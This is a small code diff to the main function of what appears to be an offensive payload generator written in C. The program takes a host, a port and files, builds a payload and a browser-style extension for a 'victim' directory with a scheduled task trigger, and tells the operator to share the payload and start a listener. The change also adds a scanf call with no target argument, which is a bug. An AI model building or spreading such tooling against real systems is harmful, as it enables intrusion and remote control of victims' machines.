@@ -318,10 +318,12 @@ int main(int argc, char const *argv[])
     printf("FILES PROVIDED : %s and %s\n", first_file_provided, second_file_provided);
     printf("HOST PROVIDED : %s\n", host);
     printf("PORT PROVIDED : %s\n", port);
-    printf("Now you just have to place %s and %s here %s, share the PAYLOAD and start your listener.\nHappy hunting !!", first_file_provided, second_file_provided, file_provider);
 
     generatePayload(victim_dir, file_provider, first_file_provided, second_file_provided, task_name, task_trigger);
     generateExtension(victim_dir, host, port, second_file_provided, first_file_provided);
+
+    printf("Now you just have to place %s and %s here %s, share the PAYLOAD and start your listener.\nHappy hunting !!", first_file_provided, second_file_provided, file_provider);
+    scanf("%d");
 
     return 0;
 }
